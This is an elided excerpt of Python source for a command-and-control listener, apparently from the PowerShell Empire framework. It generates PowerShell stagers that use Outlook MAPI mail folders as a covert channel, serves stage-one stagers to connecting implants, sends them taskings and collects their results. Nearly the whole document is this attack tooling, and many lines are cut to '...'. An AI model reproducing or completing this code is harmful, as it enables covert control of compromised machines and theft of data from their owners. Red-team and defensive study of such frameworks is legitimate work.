...
class Listener(object):
                ...
                if safeChecks.lower() == "true":
                    ...
                    if listenerOptions["Email"]["Value"] != "":
                        stager += (
                            "$fld = $"
                            + helpers.generate_random_script_var_name("GPF")
                            + '.Session.Folders | Where-Object {$_.Name -eq "'
                            + listenerOptions["Email"]["Value"]
                            + '"} | %{$_.Folders.Item(2).Folders.Item("'
                            + listenerOptions["Folder"]["Value"]
                            + '")};'
                        )
                        stager += (
                            "$fldel = $"
                        ...
                        stager += (
                            "$fld = $"
                            + helpers.generate_random_script_var_name("GPF")
                            + '.Session.GetDefaultFolder(6).Folders.Item("'
                            + listenerOptions["Folder"]["Value"]
                            + '");'
                        )
                        stager += (
    ...
    def generate_stager(
        self, listenerOptions, encode=False, encrypt=True, language="powershell"
    ):
        """
        ...
        if language.lower() == "powershell":
            ...
            f = open(
                "%s/data/agent/stagers/http_mapi.ps1" % (self.mainMenu.installPath)
            )
            stager = f.read()
            f.close()
    ...
    def generate_agent(self, listenerOptions, language=None):
        ...
        if not language:
            print(
                helpers.color(
                    "[!] listeners/http_mapi generate_agent(): no language specified!"
                )
            )
            return None
        ...
        if language == "powershell":
            ...
            print(
                helpers.color(
                    "[!] listeners/http_mapi generate_agent(): invalid language specification, only 'powershell' is currently supported for this module."
                )
            )
    ...
    def start_server(self, listenerOptions):
        ...
        def check_ip():
            ...
            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                dispatcher.send(
                    "[!] %s on the blacklist/not on the whitelist requested resource"
                    % (request.remote_addr),
        ...
        def handle_get(request_uri):
            ...
            if routingPacket:
                    ...
                    for (language, results) in dataResults:
                        if results:
                            if results == "STAGE0":
                                ...
                                dispatcher.send(
                                    "[*] Sending %s stager (stage 1) to %s"
                                    % (language, clientIP),
                                    sender="listeners/http",
                                )
                                stage = self.generate_stager(
                                    language=language, listenerOptions=listenerOptions
                                )
                                return make_response(stage, 200)

                            elif results.startswith("ERROR:"):
                                dispatcher.send(
                                    "[!] Error from agents.handle_agent_data() for %s from %s: %s"
                                ...
                                # actual taskings
                                dispatcher.send(
                                    "[*] Agent from %s retrieved taskings" % (clientIP),
                                    sender="listeners/http",
                                )
                ...
                dispatcher.send(
                    "[!] %s requested by %s with no routing packet."
            ...
            if dataResults and len(dataResults) > 0:
                for (language, results) in dataResults:
                    if results:
                        if results.startswith("STAGE2"):
                        ...
                        elif results[:10].lower().startswith("error") or results[
                            :10
                            ...
                            dispatcher.send(
                                "[*] Valid results return by %s" % (clientIP),
                                sender="listeners/http",
                            )
                            return make_response(self.default_response(), 200)
                        else:
